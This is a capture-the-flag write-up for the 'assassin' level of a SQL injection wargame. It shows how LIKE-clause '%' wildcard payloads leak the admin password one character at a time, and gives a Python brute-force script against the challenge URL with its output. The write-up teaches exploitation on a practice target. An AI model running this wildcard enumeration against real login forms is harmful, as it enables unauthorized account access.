---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 15
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/a4d30de7-86ed-4978-8c4c-38f8827700a5)

We are provided with theSQL query:

```sql
SELECT id FROM prob_assassin WHERE pw LIKE '{$_GET[pw]}'
```

## Filter

The code filters out the following characters:

- Single quotes

## Blind SQL Injection

We have to use wildcards to leak out the password.

#### Wildcard

![Pasted image 20240621082037](https://github.com/Kunull/Write-ups/assets/110326359/7c57a891-1577-4c2d-940d-556cac31d631)

More specifically, we have to use the (`%`) wildcard.

If we provide the following URI parameter:

```
?pw=%
```

The resultant query becomes:

```sql
SELECT id FROM prob_assassin WHERE pw LIKE '%'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/4f441821-33d7-40d8-ac70-76dea5327282)

Since the `Hello guest` message is printed, we know that the `guest` user has a lower index than the `admin` user.

Let's provide the following URI:

```
?pw=0%
```

The resultant query becomes:

```sql
SELECT id FROM prob_assassin WHERE pw LIKE '0%'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/111c6b2d-5420-4ed9-adbd-2fd4e989cc44)

The first character of none of the passwords is `0`.

We can try other characters moving up to the following:

```
?pw=9%
```

The resultant query becomes:

```sql
SELECT id FROM prob_assassin WHERE pw LIKE '9%'
```

![4](https://github.com/Kunull/Write-ups/assets/110326359/949f9c1a-f635-4af9-a930-8a212bf4ce66)

So the first character of both the `admin` and `guest` password is common, being `9`.

We can keep on following this method until the `Hello admin` message is included in the response. That tells us that the password is exclusive to the `admin` only.

```
902%
```

### Script

We can automate the entire process using a script.

```python title="assassin_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'cih6lj5v0dkr263t42fnn0d7br'}
url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'

guest_password = ''
admin_password = ''
searchspace = string.digits + string.ascii_letters
print()

for index in range(1, 9):
  for char in searchspace:
    payload = f"{guest_password}{char}"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f'{url}?pw={encoded_payload}%'

    response = requests.get(full_url, cookies=cookies)

    if ("Hello admin" in response.text):
      admin_password = guest_password + char 
      break
    elif ("Hello guest" in response.text):
      guest_password += char
      print(f'[x] Common character: {char}')
      break

print()
print(f'[x] Distinct character: {char}')
print(f'[!] Extracted password: {admin_password}%')
print(f'[!] Final payload: ?pw={admin_password}%')
```

```
$ python .\assassin_script.py

[x] Common character: 9
[x] Common character: 0

[x] Distinct character: 2  
[!] Extracted password: 902%
[!] Final payload: ?pw=902% 
```

If we provide the following URI:

```
?pw=902%
```

The resultant query becomes:

```sql
SELECT id FROM prob_assassin WHERE pw LIKE '902%'
```

![0](https://github.com/Kunull/Write-ups/assets/110326359/72b89d8f-5346-492b-a89d-52247da864c1)
